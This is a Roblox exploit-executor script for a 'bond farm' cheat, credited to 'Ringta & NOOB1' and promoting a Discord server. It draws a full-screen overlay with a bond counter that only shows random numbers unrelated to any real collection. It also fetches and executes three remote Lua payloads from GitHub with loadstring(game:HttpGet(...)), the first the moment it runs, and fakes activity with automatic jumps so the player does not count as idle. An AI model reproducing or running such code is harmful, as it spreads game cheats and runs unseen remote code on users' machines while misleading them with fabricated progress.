local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TitleLabel = Instance.new("TextLabel")
local DiscordBox = Instance.new("TextBox") -- Changed to TextBox for copyable Discord
local StatusLabel = Instance.new("TextLabel")
local CreditsLabel = Instance.new("TextLabel")
local BondsLabel = Instance.new("TextLabel")

-- ScreenGui Settings
ScreenGui.Name = "ScreenBlocker"
ScreenGui.DisplayOrder = 999999999
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

-- Main Frame (70% of screen, centered)
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0.7, 0, 0.7, 0) 
Frame.Position = UDim2.new(0.15, 0, 0.15, 0) 
Frame.BackgroundTransparency = 0
Frame.Parent = ScreenGui

-- Black and White Gradient Background
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), 
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)) 
})
UIGradient.Rotation = 45
UIGradient.Parent = Frame

-- Rounded Corners
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

-- Title Label
TitleLabel.Name = "Title"
TitleLabel.Parent = Frame
TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TitleLabel.Size = UDim2.new(0.8, 0, 0.15, 0)
TitleLabel.Position = UDim2.new(0.5, 0, 0.15, 0) -- Slightly moved higher
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "RINGTA BOND FARM"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextStrokeTransparency = 0.7
TitleLabel.TextStrokeColor3 = Color3.fromRGB(100, 100, 100)
TitleLabel.ZIndex = 2

-- Discord Box (Copyable Text)
DiscordBox.Name = "Discord"
DiscordBox.Parent = Frame
DiscordBox.AnchorPoint = Vector2.new(0.5, 0.5)
DiscordBox.Size = UDim2.new(0.8, 0, 0.1, 0)
DiscordBox.Position = UDim2.new(0.5, 0, 0.35, 0) -- Positioned under the title
DiscordBox.BackgroundTransparency = 1
DiscordBox.Text = "discord.gg/ringta"
DiscordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordBox.TextScaled = true
DiscordBox.Font = Enum.Font.GothamMedium
DiscordBox.TextStrokeTransparency = 0.8
DiscordBox.ZIndex = 2
DiscordBox.TextEditable = false -- Non-editable, but selectable/copyable
DiscordBox.ClearTextOnFocus = false
DiscordBox.CursorPosition = -1 -- Hide text cursor

-- Optional: Click to copy Discord link if setclipboard available (exploit only)
DiscordBox.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard("discord.gg/ringta")
        DiscordBox.Text = "Copied!"
        task.wait(1.2)
        DiscordBox.Text = "discord.gg/ringta"
    end
end)

-- Status Label
StatusLabel.Name = "Status"
StatusLabel.Parent = Frame
StatusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
StatusLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
StatusLabel.Position = UDim2.new(0.5, 0, 0.7, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Getting ready to collect bonds"
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusLabel.TextScaled = true
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.ZIndex = 2

-- Credits Label
CreditsLabel.Name = "Credits"
CreditsLabel.Parent = Frame
CreditsLabel.AnchorPoint = Vector2.new(0.5, 0.5)
CreditsLabel.Size = UDim2.new(0.8, 0, 0.08, 0)
CreditsLabel.Position = UDim2.new(0.5, 0, 0.9, 0)
CreditsLabel.BackgroundTransparency = 1
CreditsLabel.Text = "Created by Ringta & NOOB1"
CreditsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
CreditsLabel.TextScaled = true
CreditsLabel.Font = Enum.Font.Gotham
CreditsLabel.TextTransparency = 0.3
CreditsLabel.ZIndex = 2

-- Bonds Label
BondsLabel.Name = "BondsCount"
BondsLabel.Parent = Frame
BondsLabel.AnchorPoint = Vector2.new(0.5, 0.5)
BondsLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
BondsLabel.Position = UDim2.new(0.5, 0, 0.8, 0)
BondsLabel.BackgroundTransparency = 1
BondsLabel.Text = "0 bonds collected"
BondsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BondsLabel.TextScaled = true
BondsLabel.Font = Enum.Font.GothamBold
BondsLabel.ZIndex = 2

-- Status updates with correct timing
task.spawn(function()
    task.wait(10)
    StatusLabel.Text = "Collecting bonds..."
end)

-- Bonds Collection Logic
local bonds = 1
local targetBonds = math.random(70, 90)
local totalTime = 85
local interval = (totalTime / (targetBonds - bonds)) * 1.2

task.spawn(function()
    task.wait(12)
    print("Starting bond collection...")
    while bonds < targetBonds do
        task.wait(interval)
        bonds = math.min(bonds + math.random(2, 5), targetBonds)
        BondsLabel.Text = tostring(bonds) .. " bonds collected"
        print("Updated Bonds:", bonds)
    end
    StatusLabel.Text = "Bonds collection completed!"
end)

-- Status update for "Restarting script soon"
task.spawn(function()
    task.wait(60)
    StatusLabel.Text = "Restarting script soon"
end)

-- Gradient Animation Optimization
task.spawn(function()
    while true do
        for i = 0, 360, 3 do
            UIGradient.Rotation = i
            task.wait(0.05)
        end
    end
end)

-- Auto-execute the loadstring immediately
loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/newqueue.github.io/refs/heads/main/erner.lua"))()

task.spawn(function()
    task.wait(4)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/unrele.github.io/refs/heads/main/roek.lua"))()
end)

task.spawn(function()
    task.wait(120)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
end)

-- Idle Jump Prevention
task.spawn(function()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end
    local lastPosition = rootPart.Position
    while true do
        task.wait(10)
        if (rootPart.Position - lastPosition).Magnitude < 5 then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Jump = true
            end
        end
        lastPosition = rootPart.Position
    end
end)
